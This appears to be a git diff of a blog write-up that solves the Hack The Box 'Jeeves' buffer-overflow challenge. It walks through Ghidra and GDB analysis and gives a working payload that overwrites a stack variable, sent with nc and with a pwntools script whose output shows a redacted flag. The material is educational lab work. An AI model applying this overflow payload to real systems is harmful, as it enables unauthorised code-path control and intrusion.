@@ -7,7 +7,7 @@ classes: wide
 toc: true
 ---
 # Intro to Binary Exploitation: HTB Jeeves Writeup
-Today we take on a simple binary exploitation challenge from Hack The Box. In this post we are going to solve the Jeeves Pwn challenge from the Intro to Binary Exploitation track.
+Today we take on a simple binary exploitation challenge from Hack The Box. In this post we are going to solve the Jeeves Pwn challenge from the **Intro to Binary Exploitation** track.
 
 ## Running the program
 We start off by running the program normally. We are given a prompt asking for our name.
@@ -42,13 +42,15 @@ main(void){
   return 0;
 }
 ```
-The user input is stored inside the input buffer with a size of 44 bytes. We also see there is a `flag.txt` file that gets opened after the if-statement that verfifies if the `check` variable is equal to the value `0x1337bab3` (or in other words 'leetbabe'). However, this check is never going to succeed because the `check` variable is initialized in a different wat. We therefore need to find out how to overwrite this variable on the stack. The assembly view in Ghidra shows this variable is given the hex value of `0xdeadc0d3` (since this is indeed just dead code).
+The user input is stored inside the input buffer with a size of 44 bytes. We also see there is a `flag.txt` file that gets opened after the if-statement that verfifies if the `check` variable is equal to the value `0x1337bab3` (or in other words 'leetbabe'). However, this check is never going to succeed because the `check` variable is initialized in a different way. We therefore need to find out how to overwrite this variable on the stack. 
+
+The assembly view in Ghidra shows this variable is given the hex value of `0xdeadc0d3` (since this is indeed just dead code).
 ![ghidra](/assets/images/binary-exploitation/ghidra.png)
 
 ## Examining the binary in GDB
-Loading the binary into GDB and disassembling the main function we get the following output:
-```bash
-gdb jeeves
+Loading the binary into GDB and disassembling the `main` function we get the following output:
+```assembly
+$ gdb jeeves
 
 pwndbg> disass main
 Dump of assembler code for function main:
@@ -70,8 +72,8 @@ Dump of assembler code for function main:
    0x000000000000122c <+67>:    mov    eax,0x0
    0x0000000000001231 <+72>:    call   0x10a0 <printf@plt>
 ```
-Our task is to figure out how many bytes we have to overflow the buffer in order to overwrite the `check` variable. Lets's set a breakpoint right after the gets call and run the program (just enter some A's as our input):
-```bash
+Our task is to figure out how many bytes we have to overflow the buffer in order to overwrite the `check` variable. Lets's set a breakpoint right after the `gets` call and run the program (just enter some A's as our input):
+```assembly
 pwndbg> b *main+53
 pwndbg> r
 
@@ -150,7 +152,7 @@ pwndbg> r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*60 + b"\xb3
 ## Executing our payload on the target
 Here we will show 2 ways of executing our payload. The first method is a manual approach, while the other is a more automated way using `pwntools`.
 
-### Method 1
+### Method 1 (manual)
 ```bash
 nc <IP_ADDRESS> <PORT> <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*60 + b"\xb3\xba\x37\x13")')
 ```
@@ -173,7 +175,9 @@ Runing our exploit code:
 ```bash
 $ python3 exploit.py
 [+] Starting local process '/usr/bin/nc': pid 20136
-b"Cmd line: Hello, good sir!\nMay I have your name? Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb3\xba7\x13, hope you have a good day!\nPleased to make your acquaintance. Here's a small gift: HTB{w3*****************!}"
+b"Cmd line: Hello, good sir!
+May I have your name? Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb3\xba7\x13, hope you have a good day!
+Pleased to make your acquaintance. Here's a small gift: HTB{w3*****************!}"
 [*] Process '/usr/bin/nc' stopped with exit code 0 (pid 20136)
 ```
 After running our exploit, we indeed get the flag back. We have successfully completed our first pwn challenge in the Intro to Binary Exploitation track.
